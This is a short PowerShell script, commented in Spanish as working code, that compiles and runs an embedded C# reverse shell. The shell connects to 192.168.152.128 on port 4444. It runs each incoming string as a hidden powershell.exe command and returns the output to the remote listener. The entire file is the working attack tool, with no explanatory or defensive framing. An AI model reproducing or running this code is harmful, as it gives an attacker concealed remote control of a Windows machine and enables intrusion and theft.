# Código C# que ya funciona
$csharpCode = @'
using System;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;

public class ReverseShell {
    public static void Main() {
        string ip = "192.168.152.128";
        int port = 4444;
        
        using (TcpClient client = new TcpClient(ip, port)) {
            using (NetworkStream stream = client.GetStream()) {
                byte[] bytes = new byte[65536];
                int i;
                
                while ((i = stream.Read(bytes, 0, bytes.Length)) != 0) {
                    string data = Encoding.ASCII.GetString(bytes, 0, i);
                    string output = ExecuteCommand(data);
                    byte[] msg = Encoding.ASCII.GetBytes(output + "PS> ");
                    stream.Write(msg, 0, msg.Length);
                }
            }
        }
    }
    
    private static string ExecuteCommand(string command) {
        Process process = new Process();
        process.StartInfo.FileName = "powershell.exe";
        process.StartInfo.Arguments = "-c \"" + command + "\"";
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;
        process.Start();
        string output = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
        process.WaitForExit();
        return output;
    }
}
'@

# Compilar y ejecutar
Add-Type -TypeDefinition $csharpCode -Language CSharp
[ReverseShell]::Main()
